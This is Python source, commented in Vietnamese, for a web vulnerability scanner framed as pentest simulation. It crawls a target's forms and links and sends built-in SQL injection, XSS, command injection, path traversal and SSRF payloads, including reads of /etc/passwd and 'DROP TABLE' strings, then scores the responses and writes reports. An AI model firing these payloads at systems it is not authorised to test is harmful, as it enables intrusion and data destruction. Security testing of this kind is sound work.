"""
🗡️ MODULE 1 — AI VULNERABILITY SCANNER (Active Attacker)
=========================================================
Mục đích: Chủ động quét + giả lập tấn công vào web mục tiêu,
phân tích response để phát hiện lỗ hổng, tạo báo cáo.

Sử dụng:
    python modul1_scanner.py --target http://localhost:5173
    python modul1_scanner.py --target http://localhost:5173 --report
"""

import requests
import re
import json
import time
import argparse
import numpy as np
import tensorflow as tf
from tensorflow.keras.preprocessing.sequence import pad_sequences
import pickle
import os
import logging
from datetime import datetime
from html.parser import HTMLParser
from urllib.parse import urljoin, urlparse, urlencode

# ===== LOGGING =====
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - [SCANNER] - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# ===== CONFIG =====
MODEL_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "model")
MAX_LEN = 150

# ===== COLOR OUTPUT =====
class Color:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    BOLD = '\033[1m'
    END = '\033[0m'


# ===== HTML FORM PARSER =====
class FormParser(HTMLParser):
    """Phân tích HTML tìm các form và input để tấn công"""
    def __init__(self):
        super().__init__()
        self.forms = []
        self.current_form = None
        self.links = []

    def handle_starttag(self, tag, attrs):
        attrs_dict = dict(attrs)
        if tag == 'form':
            self.current_form = {
                'action': attrs_dict.get('action', ''),
                'method': attrs_dict.get('method', 'GET').upper(),
                'inputs': []
            }
        elif tag == 'input' and self.current_form is not None:
            self.current_form['inputs'].append({
                'name': attrs_dict.get('name', ''),
                'type': attrs_dict.get('type', 'text'),
                'value': attrs_dict.get('value', '')
            })
        elif tag == 'a':
            href = attrs_dict.get('href', '')
            if href and '?' in href:
                self.links.append(href)

    def handle_endtag(self, tag):
        if tag == 'form' and self.current_form is not None:
            self.forms.append(self.current_form)
            self.current_form = None


# ===== BỘ PAYLOAD TẤN CÔNG =====
ATTACK_PAYLOADS = {
    "SQLi": [
        "' OR '1'='1",
        "1' OR '1'='1' --",
        "admin' --",
        "1 UNION SELECT username,password FROM users--",
        "1' AND 1=1--",
        "1; DROP TABLE users--",
        "' OR 1=1#",
        "1' UNION SELECT null,null,null,null--",
    ],
    "XSS": [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert('XSS')>",
        "\"><script>alert(document.cookie)</script>",
        "javascript:alert(1)",
        "<body onload=alert('XSS')>",
    ],
    "Command Injection": [
        "127.0.0.1; whoami",
        "127.0.0.1 && id",
        "127.0.0.1 | cat /etc/passwd",
        "$(whoami)",
        "`id`",
        "127.0.0.1; ls -la /",
    ],
    "Path Traversal": [
        "../../../../etc/passwd",
        "..\\..\\..\\..\\windows\\win.ini",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "/etc/shadow",
        "..%252f..%252f..%252fetc%252fpasswd",
    ],
    "SSRF": [
        "http://169.254.169.254/latest/meta-data/",
        "http://127.0.0.1:22",
        "http://localhost:3306",
        "http://0.0.0.0:8080",
        "http://[::1]:80",
    ],
}

# Dấu hiệu tấn công thành công trong response
VULN_SIGNATURES = {
    "SQLi": [
        r"admin.*password",        # Rò rỉ dữ liệu
        r"Administrator",          # Tên role lộ ra
        r"SELECT.*FROM",           # Query lộ ra trong response
        r"syntax error",           # SQL error
        r"mysql_fetch",            # PHP SQL error
        r"ORA-\d{5}",             # Oracle error
        r"unclosed quotation",     # SQL error
        r"\(\d+,\s*'[^']+',\s*'[^']+'",  # Tuple data rò rỉ
    ],
    "XSS": [
        r"<script>alert",          # Script được render
        r"onerror=alert",          # Event handler được render
        r"<svg onload",            # SVG được render
        r"javascript:alert",       # JS URI được render
        r"<body onload",           # Body event
    ],
    "Command Injection": [
        r"root:.*:0:0",            # /etc/passwd output
        r"uid=\d+",                # id command output
        r"whoami.*\n\w+",          # whoami output
        r"total \d+",             # ls -la output
        r"drwx",                   # ls output
    ],
    "Path Traversal": [
        r"root:.*:0:0",            # /etc/passwd
        r"\[extensions\]",         # win.ini
        r"shadow",                 # /etc/shadow
        r"\.\./\.\./",            # Path reflected back
    ],
    "SSRF": [
        r"ami-id",                 # AWS metadata
        r"instance-id",            # AWS metadata
        r"Connection refused",     # Port scan response
    ],
}


# ===== AI ENGINE =====
class AIEngine:
    """Lõi AI — Load model Bi-LSTM để phân loại payload"""
    def __init__(self):
        self.model = None
        self.tokenizer = None
        self.label_encoder = None
        self.loaded = False

    def load(self):
        try:
            self.model = tf.keras.models.load_model(
                os.path.join(MODEL_DIR, 'deep_learning_agent_core.keras')
            )
            with open(os.path.join(MODEL_DIR, 'tokenizer.pkl'), 'rb') as f:
                self.tokenizer = pickle.load(f)
            with open(os.path.join(MODEL_DIR, 'label_encoder.pkl'), 'rb') as f:
                self.label_encoder = pickle.load(f)
            self.loaded = True
            logger.info("✅ AI Engine (Bi-LSTM) đã sẵn sàng")
        except Exception as e:
            logger.warning(f"⚠️ Không load được AI model: {e}")
            logger.warning("   Scanner vẫn chạy được (chế độ rule-based)")
            self.loaded = False

    def classify(self, payload):
        """Phân loại payload bằng AI model"""
        if not self.loaded:
            return "Unknown", 0.0
        try:
            seq = self.tokenizer.texts_to_sequences([str(payload)])
            pad = pad_sequences(seq, maxlen=MAX_LEN, padding='post', truncating='post')
            pred = self.model.predict(pad, verbose=0)[0]
            idx = np.argmax(pred)
            label = self.label_encoder.inverse_transform([idx])[0]
            confidence = float(pred[idx]) * 100
            return label, confidence
        except:
            return "Unknown", 0.0


# ===== SCANNER CHÍNH =====
class VulnerabilityScanner:
    """
    🗡️ Module 1 — Active Vulnerability Scanner
    Chủ động tấn công thử vào web mục tiêu, phân tích response.
    """

    def __init__(self, target_url):
        self.target_url = target_url.rstrip('/')
        self.ai = AIEngine()
        self.ai.load()
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'AI-SecurityScanner/1.0 (Module1-PenTest)'
        })
        self.vulnerabilities = []    # Danh sách lỗ hổng phát hiện
        self.scan_results = []       # Tất cả kết quả scan
        self.endpoints = []          # Các endpoint tìm được
        self.start_time = None
        self.end_time = None

    def banner(self):
        print(f"""
{Color.CYAN}{Color.BOLD}
╔══════════════════════════════════════════════════════╗
║  🗡️  AI VULNERABILITY SCANNER — MODULE 1            ║
║  Active Attack Simulation & Vulnerability Detection  ║
╠══════════════════════════════════════════════════════╣
║  Target : {self.target_url:<41s}║
║  Engine : Bi-LSTM Deep Learning + Rule-Based         ║
║  Mode   : Giả lập tấn công (Pentest Simulation)     ║
╚══════════════════════════════════════════════════════╝
{Color.END}""")

    # ----- Phase 1: Crawl tìm endpoint -----
    def crawl_target(self):
        """Crawl trang chủ, tìm tất cả form và link có parameter"""
        print(f"\n{Color.BLUE}[Phase 1] 🔍 Crawling target...{Color.END}")

        try:
            resp = self.session.get(self.target_url, timeout=10)
            if resp.status_code != 200:
                print(f"  {Color.RED}❌ Target trả về HTTP {resp.status_code}{Color.END}")
                return False
        except requests.ConnectionError:
            print(f"  {Color.RED}❌ Không kết nối được tới {self.target_url}{Color.END}")
            print(f"  {Color.YELLOW}💡 Hãy chạy: python webtest.py (port 5173){Color.END}")
            return False

        # Parse forms
        parser = FormParser()
        parser.feed(resp.text)

        # Thêm các form tìm được
        for form in parser.forms:
            action = urljoin(self.target_url, form['action'])
            for inp in form['inputs']:
                if inp['name'] and inp['type'] not in ['submit', 'button', 'hidden']:
                    self.endpoints.append({
                        'url': action,
                        'param': inp['name'],
                        'method': form['method'],
                        'source': 'form'
                    })

        # Thêm các link có query params
        for link in parser.links:
            full_url = urljoin(self.target_url, link)
            parsed = urlparse(full_url)
            if parsed.query:
                for part in parsed.query.split('&'):
                    if '=' in part:
                        param = part.split('=')[0]
                        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                        self.endpoints.append({
                            'url': base_url,
                            'param': param,
                            'method': 'GET',
                            'source': 'link'
                        })

        # Loại bỏ trùng lặp
        seen = set()
        unique = []
        for ep in self.endpoints:
            key = f"{ep['url']}|{ep['param']}"
            if key not in seen:
                seen.add(key)
                unique.append(ep)
        self.endpoints = unique

        print(f"  ✅ Tìm thấy {Color.BOLD}{len(self.endpoints)}{Color.END} điểm đầu vào:")
        for ep in self.endpoints:
            print(f"     • {ep['method']} {ep['url']}  →  param: {Color.YELLOW}{ep['param']}{Color.END}")

        return len(self.endpoints) > 0

    # ----- Phase 2: Tấn công giả lập -----
    def attack_endpoint(self, endpoint, attack_type, payload):
        """Gửi 1 payload tấn công vào 1 endpoint, phân tích kết quả"""
        url = endpoint['url']
        param = endpoint['param']

        try:
            if endpoint['method'] == 'GET':
                resp = self.session.get(url, params={param: payload}, timeout=5)
            else:
                resp = self.session.post(url, data={param: payload}, timeout=5)

            # Kiểm tra response có dấu hiệu lỗ hổng không
            is_vulnerable = False
            evidence = []

            # Check regex signatures
            if attack_type in VULN_SIGNATURES:
                for pattern in VULN_SIGNATURES[attack_type]:
                    match = re.search(pattern, resp.text, re.IGNORECASE)
                    if match:
                        is_vulnerable = True
                        evidence.append(f"Pattern match: {match.group()[:60]}")

            # Check payload reflected in response (XSS check)
            if attack_type == "XSS" and payload in resp.text:
                is_vulnerable = True
                evidence.append("Payload reflected in response (unescaped)")

            # Check if path traversal content reflected
            if attack_type == "Path Traversal" and "../" in payload and "../" in resp.text:
                is_vulnerable = True
                evidence.append("Path traversal pattern reflected")

            # AI classification
            ai_label, ai_conf = self.ai.classify(payload)

            result = {
                'endpoint': url,
                'param': param,
                'method': endpoint['method'],
                'attack_type': attack_type,
                'payload': payload,
                'status_code': resp.status_code,
                'is_vulnerable': is_vulnerable,
                'evidence': evidence,
                'ai_classification': ai_label,
                'ai_confidence': ai_conf,
                'response_length': len(resp.text),
                'timestamp': datetime.now().isoformat()
            }

            self.scan_results.append(result)

            if is_vulnerable:
                self.vulnerabilities.append(result)

            return result

        except requests.Timeout:
            return {'payload': payload, 'error': 'Timeout', 'is_vulnerable': False}
        except Exception as e:
            return {'payload': payload, 'error': str(e), 'is_vulnerable': False}

    def run_attacks(self):
        """Phase 2: Gửi tất cả payload vào tất cả endpoint"""
        print(f"\n{Color.RED}[Phase 2] 🗡️ Bắt đầu giả lập tấn công...{Color.END}")
        total_tests = 0

        for ep in self.endpoints:
            path = urlparse(ep['url']).path
            print(f"\n  {Color.BOLD}── Tấn công: {ep['method']} {path}?{ep['param']}=... ──{Color.END}")

            for attack_type, payloads in ATTACK_PAYLOADS.items():
                for payload in payloads:
                    total_tests += 1
                    result = self.attack_endpoint(ep, attack_type, payload)

                    if result.get('is_vulnerable'):
                        print(f"    {Color.RED}🔴 VULN{Color.END} [{attack_type}] "
                              f"{Color.YELLOW}{payload[:50]}{Color.END}")
                        for ev in result.get('evidence', []):
                            print(f"         └─ Evidence: {ev[:70]}")
                    else:
                        # Chỉ hiện dấu chấm cho SAFE để không spam
                        pass

            # Tóm tắt sau mỗi endpoint
            ep_vulns = [v for v in self.vulnerabilities
                        if v['endpoint'] == ep['url'] and v['param'] == ep['param']]
            ep_safe = total_tests - len(ep_vulns)
            if ep_vulns:
                print(f"    {Color.RED}⚠️  Endpoint này có {len(ep_vulns)} lỗ hổng!{Color.END}")
            else:
                print(f"    {Color.GREEN}✅ Endpoint này an toàn{Color.END}")

        print(f"\n  📊 Tổng: {total_tests} payloads đã gửi, "
              f"{Color.RED}{len(self.vulnerabilities)} lỗ hổng{Color.END} phát hiện")

    # ----- Phase 3: Tạo báo cáo -----
    def print_report(self):
        """In báo cáo tổng hợp ra terminal"""
        print(f"""
{Color.CYAN}{Color.BOLD}
╔══════════════════════════════════════════════════════╗
║           📋 BÁO CÁO QUÉT LỖ HỔNG                  ║
╚══════════════════════════════════════════════════════╝
{Color.END}""")

        duration = (self.end_time - self.start_time)
        print(f"  🎯 Target:     {self.target_url}")
        print(f"  ⏱️  Thời gian:  {duration:.1f} giây")
        print(f"  🔢 Endpoints:  {len(self.endpoints)}")
        print(f"  📦 Payloads:   {len(self.scan_results)}")
        print(f"  🔴 Lỗ hổng:    {len(self.vulnerabilities)}")

        if not self.vulnerabilities:
            print(f"\n  {Color.GREEN}{Color.BOLD}✅ KHÔNG TÌM THẤY LỖ HỔNG NÀO!{Color.END}")
            return

        # Nhóm theo loại
        vuln_by_type = {}
        for v in self.vulnerabilities:
            t = v['attack_type']
            if t not in vuln_by_type:
                vuln_by_type[t] = []
            vuln_by_type[t].append(v)

        print(f"\n  {Color.RED}{Color.BOLD}⚠️  PHÁT HIỆN {len(self.vulnerabilities)} LỖ HỔNG:{Color.END}")

        severity_map = {
            "SQLi": "🔴 CRITICAL",
            "Command Injection": "🔴 CRITICAL",
            "XSS": "🟠 HIGH",
            "Path Traversal": "🟠 HIGH",
            "SSRF": "🟠 HIGH",
            "CSRF": "🟡 MEDIUM",
        }

        for attack_type, vulns in vuln_by_type.items():
            severity = severity_map.get(attack_type, "🟡 MEDIUM")
            print(f"\n  {Color.BOLD}━━━ {severity} — {attack_type} ({len(vulns)} phát hiện) ━━━{Color.END}")

            # Lấy các endpoint bị ảnh hưởng (unique)
            affected = set()
            for v in vulns:
                affected.add(f"{v['method']} {urlparse(v['endpoint']).path}?{v['param']}")

            for ep_str in affected:
                print(f"    📍 Endpoint: {Color.YELLOW}{ep_str}{Color.END}")

            # Hiện 1-2 payload mẫu
            print(f"    💣 Payload mẫu:")
            for v in vulns[:2]:
                print(f"       • {v['payload'][:60]}")
                if v['evidence']:
                    print(f"         └─ {v['evidence'][0][:60]}")

        # Điểm số an toàn
        total_endpoints = len(self.endpoints)
        vuln_endpoints = len(set(
            f"{v['endpoint']}|{v['param']}" for v in self.vulnerabilities
        ))
        safe_endpoints = total_endpoints - vuln_endpoints
        if total_endpoints > 0:
            score = (safe_endpoints / total_endpoints) * 100
        else:
            score = 100

        print(f"\n  {Color.BOLD}📊 ĐIỂM AN TOÀN: ", end="")
        if score >= 80:
            print(f"{Color.GREEN}{score:.0f}/100{Color.END}")
        elif score >= 50:
            print(f"{Color.YELLOW}{score:.0f}/100{Color.END}")
        else:
            print(f"{Color.RED}{score:.0f}/100{Color.END}")

        print(f"     • Endpoint an toàn: {safe_endpoints}/{total_endpoints}")
        print(f"     • Endpoint có lỗi:  {vuln_endpoints}/{total_endpoints}")

    def save_report(self, output_path=None):
        """Lưu báo cáo ra file JSON + Markdown"""
        if output_path is None:
            output_path = os.path.dirname(os.path.abspath(__file__))

        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")

        # JSON report
        json_path = os.path.join(output_path, f"scan_report_{timestamp}.json")
        report_data = {
            'target': self.target_url,
            'scan_time': datetime.now().isoformat(),
            'duration_seconds': round(self.end_time - self.start_time, 2),
            'total_endpoints': len(self.endpoints),
            'total_payloads_sent': len(self.scan_results),
            'total_vulnerabilities': len(self.vulnerabilities),
            'endpoints': self.endpoints,
            'vulnerabilities': self.vulnerabilities,
        }
        with open(json_path, 'w', encoding='utf-8') as f:
            json.dump(report_data, f, ensure_ascii=False, indent=2)

        # Markdown report
        md_path = os.path.join(output_path, f"scan_report_{timestamp}.md")
        duration = self.end_time - self.start_time

        vuln_by_type = {}
        for v in self.vulnerabilities:
            t = v['attack_type']
            if t not in vuln_by_type:
                vuln_by_type[t] = []
            vuln_by_type[t].append(v)

        severity_map = {
            "SQLi": "🔴 CRITICAL",
            "Command Injection": "🔴 CRITICAL",
            "XSS": "🟠 HIGH",
            "Path Traversal": "🟠 HIGH",
            "SSRF": "🟠 HIGH",
            "CSRF": "🟡 MEDIUM",
        }

        md = f"""# 🗡️ BÁO CÁO QUÉT LỖ HỔNG — MODULE 1

**Ngày quét:** {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}
**Target:** `{self.target_url}`
**Thời gian quét:** {duration:.1f} giây
**Engine:** AI Bi-LSTM + Rule-Based Signatures

---

## 📊 Tổng quan

| Metric | Giá trị |
|--------|---------|
| Endpoints quét | {len(self.endpoints)} |
| Payloads đã gửi | {len(self.scan_results)} |
| **Lỗ hổng phát hiện** | **{len(self.vulnerabilities)}** |

---

## ⚠️ Chi tiết lỗ hổng

"""
        if not self.vulnerabilities:
            md += "> ✅ **Không tìm thấy lỗ hổng nào!**\n"
        else:
            for attack_type, vulns in vuln_by_type.items():
                severity = severity_map.get(attack_type, "🟡 MEDIUM")
                md += f"### {severity} — {attack_type}\n\n"

                affected = set()
                for v in vulns:
                    affected.add(f"`{v['method']} {urlparse(v['endpoint']).path}?{v['param']}`")

                md += f"**Endpoints bị ảnh hưởng:** {', '.join(affected)}\n\n"
                md += "| Payload | Evidence | AI Classification |\n"
                md += "|---------|----------|--------------------|\n"
                for v in vulns[:5]:
                    ev = v['evidence'][0][:40] if v['evidence'] else "—"
                    md += f"| `{v['payload'][:40]}` | {ev} | {v['ai_classification']} ({v['ai_confidence']:.0f}%) |\n"
                md += "\n---\n\n"

        # Score
        total_ep = len(self.endpoints)
        vuln_ep = len(set(f"{v['endpoint']}|{v['param']}" for v in self.vulnerabilities))
        score = ((total_ep - vuln_ep) / total_ep * 100) if total_ep > 0 else 100
        md += f"\n## 📊 Điểm an toàn: **{score:.0f}/100**\n"

        with open(md_path, 'w', encoding='utf-8') as f:
            f.write(md)

        print(f"\n  💾 Báo cáo đã lưu:")
        print(f"     • JSON: {json_path}")
        print(f"     • MD:   {md_path}")
        return json_path, md_path

    # ----- CHẠY SCAN TOÀN BỘ -----
    def run(self, save_report=False):
        """Chạy toàn bộ quy trình scan"""
        self.banner()
        self.start_time = time.time()

        # Phase 1: Crawl
        if not self.crawl_target():
            print(f"\n{Color.RED}❌ Không tìm được endpoint nào. Dừng scan.{Color.END}")
            return

        # Phase 2: Attack
        self.run_attacks()

        self.end_time = time.time()

        # Phase 3: Report
        self.print_report()

        if save_report:
            self.save_report()

        return self.vulnerabilities


# ===== FLASK API SERVER MODE =====
def create_api_server():
    """Tạo Flask server để HTML frontend gọi scan qua API"""
    from flask import Flask, request as flask_request, jsonify, send_file
    from flask_cors import CORS

    api = Flask(__name__)
    CORS(api)

    # Pre-load AI engine 1 lần
    shared_ai = AIEngine()
    shared_ai.load()

    @api.route('/')
    def serve_ui():
        """Serve giao diện HTML"""
        html_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'ai_waf_scanner.html')
        return send_file(html_path)

    @api.route('/api/health', methods=['GET'])
    def health():
        return jsonify({
            'status': 'operational',
            'ai_engine': shared_ai.loaded,
            'timestamp': datetime.now().isoformat()
        })

    @api.route('/api/scan', methods=['POST'])
    def api_scan():
        """API scan — nhận target URL, trả kết quả JSON"""
        data = flask_request.get_json()
        if not data or 'target' not in data:
            return jsonify({'error': 'Thiếu trường "target" trong request body'}), 400

        target_url = data['target'].strip()
        if not target_url.startswith('http'):
            target_url = 'http://' + target_url

        logger.info(f"🗡️ API Scan requested: {target_url}")

        scanner = VulnerabilityScanner(target_url)
        scanner.ai = shared_ai  # Dùng chung AI engine đã load
        scanner.start_time = time.time()

        # Phase 1: Crawl
        try:
            resp = scanner.session.get(target_url, timeout=10)
            if resp.status_code != 200:
                return jsonify({'error': f'Target trả về HTTP {resp.status_code}'}), 400
        except Exception as e:
            return jsonify({'error': f'Không kết nối được: {str(e)}'}), 400

        parser = FormParser()
        parser.feed(resp.text)

        for form in parser.forms:
            action = urljoin(target_url, form['action'])
            for inp in form['inputs']:
                if inp['name'] and inp['type'] not in ['submit', 'button', 'hidden']:
                    scanner.endpoints.append({
                        'url': action,
                        'param': inp['name'],
                        'method': form['method'],
                        'source': 'form'
                    })

        for link in parser.links:
            full_url = urljoin(target_url, link)
            parsed = urlparse(full_url)
            if parsed.query:
                for part in parsed.query.split('&'):
                    if '=' in part:
                        param = part.split('=')[0]
                        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                        scanner.endpoints.append({
                            'url': base_url,
                            'param': param,
                            'method': 'GET',
                            'source': 'link'
                        })

        # Deduplicate
        seen = set()
        unique = []
        for ep in scanner.endpoints:
            key = f"{ep['url']}|{ep['param']}"
            if key not in seen:
                seen.add(key)
                unique.append(ep)
        scanner.endpoints = unique

        if not scanner.endpoints:
            return jsonify({
                'error': 'Không tìm thấy endpoint nào trên trang',
                'target': target_url
            }), 404

        # Phase 2: Attack
        for ep in scanner.endpoints:
            for attack_type, payloads in ATTACK_PAYLOADS.items():
                for payload in payloads:
                    scanner.attack_endpoint(ep, attack_type, payload)

        scanner.end_time = time.time()
        duration = scanner.end_time - scanner.start_time

        # Phase 3: Build response
        severity_map = {
            "SQLi": "CRITICAL",
            "Command Injection": "CRITICAL",
            "XSS": "HIGH",
            "Path Traversal": "HIGH",
            "SSRF": "HIGH",
            "CSRF": "MEDIUM",
        }

        vuln_by_type = {}
        for v in scanner.vulnerabilities:
            t = v['attack_type']
            if t not in vuln_by_type:
                vuln_by_type[t] = []
            vuln_by_type[t].append(v)

        total_ep = len(scanner.endpoints)
        vuln_ep = len(set(f"{v['endpoint']}|{v['param']}" for v in scanner.vulnerabilities))
        score = int(((total_ep - vuln_ep) / total_ep * 100)) if total_ep > 0 else 100

        # Lưu báo cáo lỗi cho Feedback Loop (AI Agent fix)
        report_path = None
        if scanner.vulnerabilities:
            report_path = scanner.save_report()

        result = {
            'target': target_url,
            'duration': round(duration, 1),
            'total_endpoints': total_ep,
            'total_payloads': len(scanner.scan_results),
            'total_vulnerabilities': len(scanner.vulnerabilities),
            'score': score,
            'endpoints': scanner.endpoints,
            'vulnerabilities_by_type': {},
            'report_files': report_path,
        }

        for attack_type, vulns in vuln_by_type.items():
            affected = list(set(
                f"{v['method']} {urlparse(v['endpoint']).path}?{v['param']}"
                for v in vulns
            ))
            result['vulnerabilities_by_type'][attack_type] = {
                'severity': severity_map.get(attack_type, 'MEDIUM'),
                'count': len(vulns),
                'affected_endpoints': affected,
                'samples': [
                    {
                        'payload': v['payload'],
                        'evidence': v['evidence'][:2] if v['evidence'] else [],
                        'ai_label': v['ai_classification'],
                        'ai_confidence': round(v['ai_confidence'], 1),
                    }
                    for v in vulns[:5]
                ]
            }

        logger.info(f"✅ Scan hoàn tất: {len(scanner.vulnerabilities)} lỗ hổng, {duration:.1f}s")
        return jsonify(result)

    return api


# ===== MAIN =====
if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description='🗡️ AI Vulnerability Scanner — Module 1'
    )
    parser.add_argument(
        '--target', '-t',
        default=None,
        help='URL web mục tiêu cần quét (ví dụ: http://localhost:5173)'
    )
    parser.add_argument(
        '--report', '-r',
        action='store_true',
        help='Lưu báo cáo ra file (JSON + Markdown)'
    )
    parser.add_argument(
        '--server', '-s',
        action='store_true',
        help='Chạy chế độ Web Server (API + giao diện HTML)'
    )
    parser.add_argument(
        '--port', '-p',
        type=int,
        default=5001,
        help='Port cho Web Server (mặc định: 5001)'
    )
    args = parser.parse_args()

    if args.server:
        # Chế độ Web Server
        app = create_api_server()
        logger.info(f"🌐 Module 1 Web UI: http://127.0.0.1:{args.port}")
        app.run(debug=False, port=args.port, threaded=True)
    else:
        # Chế độ CLI
        target = args.target
        while not target:
            print(f"{Color.CYAN}👉 Vui lòng nhập URL mục tiêu (ví dụ: http://localhost:5170): {Color.END}", end="")
            target = input().strip()
            if target and not target.startswith('http'):
                target = 'http://' + target

        scanner = VulnerabilityScanner(target)
        while True:
            if scanner.run(save_report=args.report):
                break
            else:
                print(f"\n{Color.YELLOW}❓ Bạn có muốn thử lại với URL khác không? (y/n): {Color.END}", end="")
                choice = input().lower().strip()
                if choice != 'y':
                    break
                print(f"{Color.CYAN}👉 Nhập URL mới: {Color.END}", end="")
                new_target = input().strip()
                if new_target:
                    if not new_target.startswith('http'):
                        new_target = 'http://' + new_target
                    scanner = VulnerabilityScanner(new_target)